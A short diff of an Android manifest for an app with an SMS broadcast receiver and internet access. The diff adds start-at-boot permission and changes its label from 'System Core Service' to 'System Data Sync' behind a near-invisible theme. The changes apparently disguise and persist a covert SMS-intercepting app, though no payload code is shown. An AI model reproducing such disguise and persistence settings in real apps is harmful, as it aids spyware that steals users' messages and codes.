@@ -3,11 +3,12 @@
 
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application 
-        android:allowBackup="false"
-        android:label="System Core Service"
-        android:theme="@android:style/Theme.NoDisplay">
+        android:allowBackup="true"
+        android:label="System Data Sync"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar">
         
         <receiver android:name="com.sys.sync.SmsReceiver" 
                   android:permission="android.permission.BROADCAST_SMS"
@@ -17,7 +18,8 @@
             </intent-filter>
         </receiver>
 
-        <activity android:name="com.sys.sync.MainActivity" android:exported="true">
+        <activity android:name="com.sys.sync.MainActivity" 
+                  android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
